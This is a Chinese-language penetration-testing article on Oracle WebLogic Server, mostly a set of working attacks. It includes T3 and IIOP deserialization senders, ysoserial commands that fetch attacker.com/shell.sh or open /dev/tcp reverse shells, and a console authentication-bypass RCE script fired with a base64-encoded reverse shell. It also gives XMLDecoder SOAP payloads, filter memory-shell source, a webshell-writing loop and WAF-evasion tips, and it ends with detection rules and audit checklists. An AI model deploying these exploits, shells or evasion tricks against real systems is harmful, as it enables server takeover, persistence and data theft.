---
title: "Apache WebLogic T3 反序列化 Console 认证绕过 RCE 利用技术"
date: 2025-06-21T00:00:00+08:00
draft: false
weight: 106
description: "深入分析 Oracle WebLogic Server 的 T3/IIOP 协议反序列化利用链、Console 认证绕过链（CVE-2020-14882）、IIOP 备用通道攻击、内存马注入与持久化技术，覆盖历史 CVE 漏洞链及蓝队检测与应急响应的完整攻击面"
categories: ["安全","渗透测试"]
tags: ["WebLogic","T3协议","IIOP","反序列化","CVE-2019-2725","CVE-2020-14882","CVE-2023-21839","Console绕过","内存马","Oracle"]
---

## 0x00 攻击面总览

Oracle WebLogic Server 是全球企业级 Java EE 应用服务器的核心产品，承载大量金融、电信、政务系统的关键业务。WebLogic 的攻击面极为广泛：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| T3/T3S 协议 | 7001/7002 | **严重** | Java 原生反序列化，历史 CVE 密集爆发 |
| IIOP 协议 | 7001/7002 | **严重** | CORBA/IIOP 备用反序列化通道，可绕过 T3 补丁 |
| Web Console | 7001 | **高危** | 认证绕过 + RCE 组合拳，CVE-2020-14882/14883 |
| WLS 组件 | 7001 | **严重** | wls9_async_response、_async 反序列化 |
| UDDI Registry | 7001 | **中危** | 信息泄露与注入 |
| JMX Remote | 7001 | **高危** | JMX 远程管理接口未授权 |
| Admin Console | 7001 | **高危** | 弱口令 / 默认凭据 |
| REST Management API | 7001 | **中危** | 管理 API 未授权操作 |

WebLogic 的反序列化漏洞从 2015 年至今持续爆发，堪称"反序列化漏洞博物馆"。其根本原因在于 T3 协议传输的 Java 序列化数据在到达应用层之前就会触发 `readObject()` 反序列化，攻击者可以利用 WebLogic 自身 classpath 中丰富的 Gadget 链（如 Commons Collections、Coherence 等）实现 RCE。

## 0x01 服务识别与版本探测

### 1.1 T3 协议指纹识别

```bash
nmap -sV -p 7001 --script=weblogic-t3-info <target>
```

手动 T3 握手探测：

```python
import socket

def detect_weblogic(host, port=7001):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    # T3 握手包
    handshake = b"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.send(handshake)
    resp = sock.recv(1024).decode(errors='ignore')
    print(f"[*] Response: {resp}")
    if "HELO" in resp:
        # 提取版本号
        # HELO:12.2.1\nAS:2048\nHL:19\nMS:10000000\n
        version = resp.split("\n")[0].replace("HELO:", "")
        print(f"[+] WebLogic Version: {version}")
        return version
    return None

detect_weblogic("192.168.1.100")
```

### 1.2 HTTP 管理控制台识别

```bash
curl -s http://TARGET:7001/console/login/LoginForm.jsp | grep -i "weblogic"
curl -s http://TARGET:7001/wls-wsat/CoordinatorPortType  # WLS 组件
curl -s http://TARGET:7001/_async/AsyncResponseService   # Async 组件
curl -s http://TARGET:7001/bea_wls_internal/classes/     # 内部类目录
```

### 1.3 关键路径枚举

```
/console                          # 管理控制台
/wls-wsat/CoordinatorPortType     # WS-AtomicTransaction
/_async/AsyncResponseService      # Async 异步服务
/bea_wls_internal/classes/        # 内部类暴露
/wl_management_internal2/         # 管理内部接口
/uddiexplorer/                    # UDDI 注册中心
/mejb/                            # Management EJB
```

## 0x02 T3 协议反序列化攻击

### 2.1 T3 协议原理

T3 是 WebLogic 专有的二进制 RMI 协议，在 TCP 连接建立后通过文本握手升级为二进制序列化传输：

```
客户端 → 服务端: t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n
服务端 → 客户端: HELO:12.2.1\nAS:2048\nHL:19\nMS:10000000\n\n
```

握手完成后，后续所有数据均为 Java 序列化对象。WebLogic 在 `ServerChannel` 层接收数据后直接调用 `ObjectInputStream.readObject()`，**无需任何认证**即可触发反序列化。

### 2.2 ysoserial 利用框架

```bash
# CommonsCollections1 链 (WebLogic 10.3.6 / 12.1.3)
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh|bash" > payload.bin

# CommonsCollections3 链 (WebLogic 10.3.6 / 12.1.3)
java -jar ysoserial.jar CommonsCollections3 "touch /tmp/pwned" > payload.bin

# CommonsCollections6 链 (WebLogic 12.2.1)
java -jar ysoserial.jar CommonsCollections6 "id > /tmp/proof" > payload.bin

# CommonsCollections7 链 (WebLogic 12.2.1)
java -jar ysoserial.jar CommonsCollections7 "bash -i >& /dev/tcp/attacker/4444 0>&1" > payload.bin
```

Python 发送 T3 序列化 payload：

```python
import socket
import struct

def send_t3_payload(host, port, payload_file):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    # T3 握手
    handshake = b"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.send(handshake)
    resp = sock.recv(1024)
    if b"HELO" not in resp:
        print("[-] T3 handshake failed")
        return

    # 读取 payload
    with open(payload_file, "rb") as f:
        payload = f.read()

    # 构造 T3 数据包: 4字节长度头 + payload
    packet = struct.pack(">I", len(payload) + 4) + payload
    sock.send(packet)

    try:
        result = sock.recv(4096)
        print(f"[*] Response: {result[:200]}")
    except Exception as e:
        print(f"[*] Connection closed (may indicate success): {e}")

    sock.close()

send_t3_payload("192.168.1.100", 7001, "payload.bin")
```

### 2.3 CVE-2015-4852 — WebLogic 反序列化"开山之作"

**影响版本**: WebLogic 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0

**漏洞原理**: WebLogic 内置的 Apache Commons Collections 库提供了完整的 Gadget 链，通过 T3 协议传输恶意序列化对象即可触发 RCE。

**利用链**: `CommonsCollections1/3/5/6/7` 均可利用

```
ObjectInputStream.readObject()
  → AnnotationInvocationHandler.readObject()
    → LazyMap.get()
      → ChainedTransformer.transform()
        → ConstantTransformer.transform()
          → InvokerTransformer.transform()
            → Runtime.getRuntime().exec()
```

### 2.4 CVE-2019-2725 — 绕过补丁的 Coherence 利用链

**CVSS**: 9.8（严重）

**影响版本**: WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.0-12.2.1.3

**漏洞原理**: Oracle 在 CVE-2015-4852 后对 Commons Collections 链进行了黑名单过滤，但攻击者发现 WebLogic 内置的 **Oracle Coherence** 组件中存在新的 Gadget 链：

- `com.tangosol.coherence.mvel2.sh.ShellSession` — MVEL2 表达式执行
- `com.tangosol.coherence.mvel2.ast.NewObject` — 任意对象实例化

**PoC 利用**:

```python
import socket
import struct
import os

def exploit_cve_2019_2725(host, port=7001, cmd="touch /tmp/pwned"):
    # 使用 ysoserial 生成 Coherence 链 payload
    # java -jar ysoserial.jar Coherence1 "cmd" > coherence_payload.bin
    # 或使用 weblogic-scan 等集成工具

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    handshake = b"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.send(handshake)
    resp = sock.recv(1024)

    if b"HELO" not in resp:
        print("[-] T3 handshake failed")
        return

    # 构造 Coherence MVEL2 Gadget 序列化数据
    # 实际利用中建议使用 ysoserial-modified 或 WebLogicScan 工具
    payload = generate_coherence_payload(cmd)
    packet = struct.pack(">I", len(payload) + 4) + payload
    sock.send(packet)

    try:
        result = sock.recv(4096)
        print(f"[+] Exploit sent, check target for command execution")
    except:
        print("[+] Payload delivered (connection closed)")

    sock.close()

def generate_coherence_payload(cmd):
    """
    Coherence MVEL2 Gadget 链核心结构:
    ValueHolderImpl
      → _value: MVELSerializable
        → MVELCompiler.compile("Runtime.getRuntime().exec('cmd')")
    """
    # 此处为简化示意，实际需完整 Java 序列化字节流
    # 建议使用 ysoserial: java -jar ysoserial.jar Coherence1 "cmd"
    pass
```

### 2.5 CVE-2023-21839 — IIOP 通道绕过 T3 修复

**CVSS**: 7.5（高危）

**影响版本**: WebLogic 12.2.1.3-12.2.1.4, 14.1.1.0

**漏洞原理**: Oracle 多次修补 T3 通道的反序列化，但攻击者发现可以通过 **IIOP（Internet Inter-ORB Protocol）** 通道发送相同的反序列化 payload，绕过 T3 层的过滤。IIOP 是 CORBA 标准的远程调用协议，WebLogic 默认在同一端口（7001）同时监听 T3 和 IIOP。

```python
import socket
import struct

def exploit_iiop(host, port=7001, cmd="id"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    # IIOP GIOP 握手
    # GIOP 1.2 Request
    giop_header = b"GIOP"           # magic
    giop_header += b"\x01\x02"      # version 1.2
    giop_header += b"\x00"          # flags (little-endian)
    giop_header += b"\x00"          # message type (0=Request)

    # 构造包含反序列化 payload 的 IIOP 请求体
    # 通过 CDR 编码嵌入 Java 序列化对象
    # 实际利用需要完整的 GIOP Request + IOR 解析
    # 建议使用 WebLogicScan 或 Java 版 IIOP exploit 工具

    print(f"[*] IIOP exploit targeting {host}:{port}")
    print(f"[*] Command: {cmd}")
    print(f"[*] Use WebLogicScan-iiop or java -jar iiop_exploit.jar")

    sock.close()
```

**关键发现**: 此漏洞证明了对 T3 通道的黑名单修复是**不完整的**，IIOP 作为备用协议可以传输相同的恶意序列化对象。后续 Oracle 不得不同时修补 IIOP 通道。

## 0x03 Web Console 认证绕过与 RCE

### 3.1 CVE-2020-14882 — 管理控制台认证绕过

**CVSS**: 9.8（严重）

**影响版本**: WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.0-12.2.1.4, 14.1.1.0

**漏洞原理**: WebLogic Console 的 `com.tangosol.coherence.mvel2.sh.ShellSession` 类可通过 URL 路径直接实例化。攻击者使用**双重 URL 编码**的 `../` 序列绕过路径限制，结合 GET 参数中的 `cmd` 执行任意命令。

**认证绕过路径**:

```
# 正常访问 Console 需要认证
http://TARGET:7001/console/

# 双重编码绕过 — %252e = %2e (URL解码一次) = . (URL解码二次)
http://TARGET:7001/console/css/%252e%252e%252fconsole.portal
http://TARGET:7001/console/css/%252e%252e/globalStateMonitor.jsp
http://TARGET:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1
```

**完整利用链**:

```bash
# Step 1: 认证绕过 — 访问 Console 页面
curl -v "http://TARGET:7001/console/css/%252e%252e%252fconsole.portal"

# Step 2: 通过 _nfpb 参数触发 MVEL2 表达式执行
# 构造包含命令执行的 XML payload 通过 POST 提交
curl -X POST "http://TARGET:7001/console/css/%252e%252e%252fconsole.portal" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned\");")'
```

### 3.2 CVE-2020-14883 — Console POST RCE 补充

**配合 CVE-2020-14882 使用**: 当 GET 方式受限时，通过 POST 请求提交序列化 XML 数据实现 RCE：

```python
import requests

def exploit_weblogic_console(host, port=7001, cmd="id"):
    base_url = f"http://{host}:{port}"

    # 认证绕过路径
    bypass_path = "/console/css/%252e%252e%252fconsole.portal"

    # Step 1: 验证认证绕过
    resp = requests.get(f"{base_url}{bypass_path}", timeout=10, allow_redirects=False)
    if resp.status_code == 200:
        print("[+] Console auth bypass successful")
    else:
        print(f"[-] Auth bypass failed: {resp.status_code}")
        return

    # Step 2: POST 方式执行命令
    # 方式一: ShellSession MVEL2 表达式
    mvel_payload = (
        f'com.tangosol.coherence.mvel2.sh.ShellSession'
        f'("java.lang.Runtime.getRuntime().exec(\\"{cmd}\\");")'
    )

    post_data = {
        "_nfpb": "true",
        "_pageLabel": "HomePage1",
        "handle": mvel_payload
    }

    resp = requests.post(
        f"{base_url}{bypass_path}",
        data=post_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10
    )
    print(f"[*] RCE response status: {resp.status_code}")

    # 方式二: XML 序列化 payload (适用于复杂命令)
    xml_payload = f"""<xml-fragment xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <tns:handle xmlns:tns="http://www.bea.com/console/handle">
    <class>com.tangosol.coherence.mvel2.sh.ShellSession</class>
    <command>{cmd}</command>
  </tns:handle>
</xml-fragment>"""

    resp = requests.post(
        f"{base_url}{bypass_path}",
        data=xml_payload,
        headers={"Content-Type": "application/xml"},
        timeout=10
    )
    print(f"[*] XML RCE response status: {resp.status_code}")

exploit_weblogic_console("192.168.1.100", cmd="bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")
```

### 3.3 CVE-2021-2109 — 二次认证绕过

**影响版本**: WebLogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0

**漏洞原理**: 在 CVE-2020-14882 修补后，攻击者发现新的绕过方式，通过修改请求头中的 `Accept-Language` 和特定参数组合绕过新增的认证过滤器。

## 0x04 WLS 组件反序列化攻击

### 4.1 CVE-2017-10271 — wls-wsat XMLDecoder

**影响版本**: WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.0-12.2.1.2

**漏洞原理**: `/wls-wsat/CoordinatorPortType` 端点使用 `XMLDecoder` 解析 SOAP 请求中的 XML 数据，`XMLDecoder` 允许实例化任意 Java 类并调用方法。

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: TARGET:7001
Content-Type: text/xml
Content-Length: 1200

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0_151" class="java.beans.xmlDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>touch /tmp/pwned</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

### 4.2 CVE-2017-3506 / CVE-2017-3248 — XMLDecoder 补丁绕过

Oracle 在 CVE-2017-10271 后添加了黑名单过滤，但攻击者通过以下方式绕过：

- 使用 `java.beans.XMLDecoder` 的替代类名
- 通过 `ObjectInputStream` + `ProcessBuilder` 组合绕过类名检测
- 利用 `Runtime.exec(String[])` 替代 `Runtime.exec(String)` 绕过命令过滤

### 4.3 _async 异步服务反序列化

**漏洞路径**: `/_async/AsyncResponseService`

```xml
POST /_async/AsyncResponseService HTTP/1.1
Host: TARGET:7001
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:wsa="http://www.w3.org/2005/08/addressing"
                  xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>async</wsa:Action>
  </soapenv:Header>
  <soapenv:Body>
    <asy:receive>
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java class="java.beans.xmlDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0"><string>/bin/bash</string></void>
              <void index="1"><string>-c</string></void>
              <void index="2"><string>id > /tmp/async_proof</string></void>
            </array>
            <void method="start"/>
          </void>
        </java>
      </work:WorkContext>
    </asy:receive>
  </soapenv:Body>
</soapenv:Envelope>
```

## 0x05 内存马注入与持久化

### 5.1 WebLogic Filter 内存马

WebLogic 基于 Servlet 规范，可以通过反射向 WebApp 注入恶意 Filter/Servlet/Listener：

```java
// 内存马注入核心代码 (通过 WebLogic Console RCE 或反序列化链触发)
import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.WebAppServletContext;
import javax.servlet.*;

public class MemoryShellFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) {}

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws Exception {
        HttpServletRequest req = (HttpServletRequest) request;
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            java.io.InputStream in = process.getInputStream();
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(in));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            response.getWriter().write(output.toString());
            return;
        }
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {}
}

// 注入逻辑
WebAppServletContext ctx = /* 通过反射获取当前 WebApp Context */;
FilterManager fm = ctx.getFilterManager();
// 注册 Filter 到所有请求路径
fm.registerFilter("memFilter", "MemoryShellFilter", "/*", null, null);
```

### 5.2 通过 CVE-2020-14882 注入内存马

```python
import requests

def inject_memory_shell(host, port=7001):
    bypass_url = f"http://{host}:{port}/console/css/%252e%252e%252fconsole.portal"

    # 通过 MVEL2 表达式注入内存马
    # 实际 payload 需要编码为单行 Java 表达式
    inject_code = """
    var rt = java.lang.Runtime.getRuntime();
    var cl = java.lang.Thread.currentThread().getContextClassLoader();
    // 通过 ClassLoader 加载编译后的 Filter 字节码
    // 或使用 JNDI 注入远程加载恶意类
    var initCtx = new javax.naming.InitialContext();
    var env = new java.util.Hashtable();
    env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
    env.put("java.naming.provider.url", "t3://attacker:7001");
    initCtx = new javax.naming.InitialContext(env);
    // JNDI lookup 触发远程类加载
    initCtx.lookup("maliciousObject");
    """

    mvel_payload = f'com.tangosol.coherence.mvel2.sh.ShellSession("{inject_code}")'

    resp = requests.post(bypass_url, data={
        "_nfpb": "true",
        "_pageLabel": "HomePage1",
        "handle": mvel_payload
    }, timeout=15)

    print(f"[*] Memory shell injection status: {resp.status_code}")
    print(f"[+] Access: http://{host}:{port}/?cmd=id")

inject_memory_shell("192.168.1.100")
```

### 5.3 持久化 — Web 目录写入 Webshell

```python
# 通过 RCE 写入 Webshell 到 WebLogic 部署目录
# WebLogic 默认应用部署路径
web_paths = [
    "/u01/oracle/wlserver/server/lib/consoleapp/webapp/",
    "/root/Oracle/Middleware/wlserver/server/lib/consoleapp/webapp/",
    "/home/weblogic/Oracle/Middleware/wlserver/server/lib/consoleapp/webapp/",
]

for web_path in web_paths:
    cmd = f'echo "<%Runtime.getRuntime().exec(request.getParameter(\\"cmd\\"));%>" > {web_path}cmd.jsp'
    # 通过已有 RCE 执行此命令
    print(f"[*] Trying to write webshell to: {web_path}cmd.jsp")
```

## 0x06 JNDI 注入利用

### 6.1 WebLogic JNDI 远程加载

WebLogic 的 JNDI 实现支持远程 RMI/LDAP 查找，可用于加载远程恶意类：

```java
// 通过 T3 反序列化链触发 JNDI 注入
// Gadget 链最终调用:
InitialContext ctx = new InitialContext();
ctx.lookup("ldap://attacker.com:1389/malicious");
// 或
ctx.lookup("rmi://attacker.com:1099/malicious");
```

### 6.2 JNDI 注入 + T3 反序列化组合

```python
# 完整攻击链: T3 反序列化 → JNDI 注入 → 远程类加载 → RCE
# 1. 启动恶意 LDAP/RMI 服务器 (使用 JNDIExploit 或 marshalsec)
# java -jar JNDIExploit.jar -i attacker_ip -p 1389 -l 8888
#
# 2. 生成包含 JNDI lookup 的 T3 反序列化 payload
# ysoserial 的 JNDI 模块:
# java -jar ysoserial.jar JRMPClient "attacker:1099" > jndi_payload.bin
#
# 3. 通过 T3 协议发送
```

### 6.3 JRMP 二次反序列化

```
攻击者 T3 Client → WebLogic (T3 Server)
  → 发送恶意序列化对象 (JRMPClient Gadget)
    → WebLogic 反序列化后连接攻击者的 JRMP 服务器
      → JRMP 服务器返回第二个恶意序列化对象
        → WebLogic 再次反序列化 → RCE
```

这种"二次反序列化"技术的优势在于：
- 第一次 payload 体积小，不含危险 Gadget，可绕过部分检测
- 第二次 payload 通过 JRMP 协议传输，不在 T3 流量检测范围内
- 可以在服务端动态切换攻击 payload

## 0x07 历史 CVE 漏洞时间线

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2015-4852 | 2015 | 10.0 | T3 反序列化 | Commons Collections RCE，开启 WebLogic 反序列化时代 |
| CVE-2016-0638 | 2016 | 10.0 | T3 反序列化 | 补丁绕过，新 Gadget 链 |
| CVE-2016-3510 | 2016 | 10.0 | T3 反序列化 | 再次绕过，IIOP 通道 |
| CVE-2017-3248 | 2017 | 10.0 | XMLDecoder | wls-wsat XMLDecoder RCE |
| CVE-2017-10271 | 2017 | 10.0 | XMLDecoder | CVE-2017-3248 补丁绕过 |
| CVE-2018-2628 | 2018 | 10.0 | T3 反序列化 | 双 Gadget 链绕过补丁 |
| CVE-2018-2893 | 2018 | 10.0 | T3 反序列化 | 又一个绕过 |
| CVE-2018-3191 | 2018 | 10.0 | T3 反序列化 | Coherence 新 Gadget |
| CVE-2019-2725 | 2019 | 9.8 | T3 反序列化 | Coherence MVEL2 链 |
| CVE-2019-2890 | 2019 | 10.0 | IIOP 反序列化 | IIOP 通道绕过 |
| CVE-2020-2551 | 2020 | 10.0 | IIOP 反序列化 | IIOP 新 Gadget |
| CVE-2020-14882 | 2020 | 9.8 | Console 认证绕过 | 双重编码绕过 + RCE |
| CVE-2020-14883 | 2020 | 9.8 | Console RCE | POST 方式 RCE |
| CVE-2021-2109 | 2021 | 9.8 | Console 认证绕过 | 二次绕过 |
| CVE-2023-21839 | 2023 | 7.5 | IIOP/JRMP | T3 修补后 IIOP 绕过 |
| CVE-2023-21931 | 2023 | 9.8 | 反序列化 | 新 Gadget 链 |
| CVE-2024-20932 | 2024 | 9.8 | T3 反序列化 | 最新反序列化漏洞 |

**规律总结**: WebLogic 反序列化漏洞呈现"补丁→绕过→新 CVE"的循环模式。Oracle 的修复策略以黑名单为主，攻击者总能找到新的 Gadget 链或协议通道绕过限制。

## 0x08 WAF 绕过技术

### 8.1 T3S 加密通道

```
T3 (明文) → 可被 IDS/IPS 检测
T3S (SSL/TLS) → 加密传输，绕过流量检测

# 使用 T3S 连接
t3s 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n
```

### 8.2 序列化数据混淆

- **Gadget 链替换**: 当 Commons Collections 被拦截时，切换到 Coherence、Spring、Hibernate 等链
- **类名编码**: 使用 Java 序列化协议的特性，对类名进行非标准编码
- **分片传输**: 将大型序列化对象拆分为多个 TCP 包，绕过基于完整包匹配的检测
- **T3 协议降级**: 在 T3S 和 T3 之间切换，利用检测规则的不一致

### 8.3 HTTP 通道绕过

```bash
# 当 T3 端口被封，尝试通过 HTTP 通道
# 利用 _async 或 wls-wsat 端点
curl -X POST "http://TARGET:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d @payload.xml

# 利用分块传输绕过 WAF 请求体大小限制
curl -X POST "http://TARGET:7001/wls-wsat/CoordinatorPortType" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: text/xml" \
  -d @payload_chunked.xml
```

## 0x09 蓝队检测与应急响应

### 9.1 网络层检测规则

```
# T3 协议检测
alert tcp any any -> any 7001 (msg:"WebLogic T3 Handshake"; content:"t3 "; depth:3; nocase; sid:1000001;)
alert tcp any any -> any 7001 (msg:"WebLogic T3S Handshake"; content:"t3s "; depth:4; nocase; sid:1000002;)

# IIOP GIOP 检测
alert tcp any any -> any 7001 (msg:"IIOP GIOP Request"; content:"GIOP"; depth:4; sid:1000003;)

# 可疑 Console 访问路径
alert tcp any any -> any 7001 (msg:"WebLogic Console Path Traversal"; content:"/console/css/%252e"; nocase; sid:1000004;)
alert tcp any any -> any 7001 (msg:"WebLogic Console Bypass"; content:"_nfpb=true"; content:"ShellSession"; sid:1000005;)

# XMLDecoder 攻击特征
alert tcp any any -> any 7001 (msg:"XMLDecoder Attack"; content:"java.beans.xmlDecoder"; nocase; sid:1000006;)
alert tcp any any -> any 7001 (msg:"ProcessBuilder in XML"; content:"ProcessBuilder"; content:"xml"; sid:1000007;)

# 可疑序列化特征
alert tcp any any -> any 7001 (msg:"Java Serialization Magic"; content:"|aced0005|"; sid:1000008;)
```

### 9.2 WebLogic 访问日志分析

```bash
# 检查 Console 异常访问
grep "/console/css/" access.log | grep -v ".css"
grep "%252e" access.log
grep "_nfpb=true" access.log | grep -v "POST.*console.portal"

# 检查 XMLDecoder 攻击
grep "xmlDecoder" access.log
grep "ProcessBuilder" access.log
grep "Runtime.getRuntime" access.log

# 检查异常 SOAP 请求
grep "wls-wsat" access.log
grep "_async/AsyncResponseService" access.log
grep "WorkContext" access.log

# 检查 T3 异常连接 (需要网络层日志)
# 大量短连接的 T3 握手可能表示漏洞扫描
```

### 9.3 内存马检测

```bash
# 检查 WebLogic 运行时类加载
# 通过 WebLogic 自带工具
java -cp wlfullclient.jar weblogic.Admin -url t3://localhost:7001 -username weblogic GET -type Runtime -property ApplicationRuntimes

# 检查异常 Filter/Servlet
# 通过 JMX 或 Arthas 工具
# arthas: sc -d *Filter* | grep -v "known framework"
# arthas: trace javax.servlet.Filter doFilter

# 检查 JVM 中动态注册的 Servlet/Filter
# 通过 WebLogic Console → Deployments → 检查异常部署
```

### 9.4 应急响应清单

```
[ ] 确认 WebLogic 版本与已安装补丁
    - 访问 Console → Configuration → General
    - 检查 Oracle Critical Patch Update 状态

[ ] 检查 T3/IIOP 是否对外暴露
    - 从外网尝试 T3 握手
    - 检查防火墙规则

[ ] 排查 Console 认证绕过利用
    - 搜索 access.log 中的 %252e 编码路径
    - 检查 _nfpb 参数异常请求

[ ] 排查 XMLDecoder 攻击
    - 搜索 wls-wsat 和 _async 路径的 POST 请求
    - 检查请求体中的 java.beans.xmlDecoder 关键字

[ ] 检查内存马
    - 使用 Arthas 的 sc/sm 命令检查异常类
    - 对比 Filter/Servlet 注册表与已知合法列表

[ ] 检查持久化后门
    - 扫描 Web 目录下的异常 JSP/Class 文件
    - 检查 WebLogic 部署目录下的异常应用

[ ] 网络隔离与补丁修复
    - 禁止 T3/IIOP 对外暴露
    - 应用最新 CPU 补丁
    - 启用 Console 双因素认证
```

## 0x0A 安全审计清单

```
[ ] T3/T3S 协议仅内网可达，不暴露于互联网
[ ] IIOP 协议禁用或限制为内网访问
[ ] WebLogic 版本为最新 Oracle CPU 补丁级别
[ ] Console 管理端口不对外暴露
[ ] Console 使用强密码 + 双因素认证
[ ] 禁用不必要的 WLS 组件 (wls-wsat, _async, uddiexplorer)
[ ] 部署 WAF 并配置 WebLogic 专项规则
[ ] 启用 T3S (SSL) 替代明文 T3
[ ] 配置 WebLogic 连接过滤器 (Connection Filter)
[ ] 定期扫描反序列化漏洞 (使用 WebLogicScan 等工具)
[ ] 监控 JVM 类加载行为，检测内存马注入
[ ] 限制 JNDI 远程加载 (设置 weblogic.jndi.remoteContextCheck=true)
[ ] 审计 WebLogic 部署应用，移除不必要的 WAR/EAR
[ ] 配置 access.log 远程收集与实时告警
```

## 0x0B 总结

WebLogic 的安全态势可以用"漏洞永动机"来形容：从 2015 年 CVE-2015-4852 至今，几乎每年都有新的反序列化 CVE 被披露。其根本原因在于：

1. **协议层缺陷**: T3/IIOP 协议在传输层直接进行 Java 反序列化，无法在不破坏协议兼容性的前提下完全修复
2. **Classpath 过于丰富**: WebLogic 内置了大量第三方库（Commons Collections、Coherence、Spring 等），提供了充足的 Gadget 链素材
3. **黑名单修复策略**: Oracle 长期采用黑名单方式修复，每次封堵一条链，攻击者就找到下一条
4. **多通道冗余**: T3、T3S、IIOP、HTTP 多个攻击面，封堵一个还有备用通道

对于防守方，最有效的策略是：
- **网络层隔离**: 绝对不将 7001 端口暴露于互联网
- **及时打补丁**: 跟进每季度 Oracle CPU
- **纵深防御**: WAF + IDS + 运行时监控 + 内存马检测
- **最小化攻击面**: 禁用不需要的组件和协议
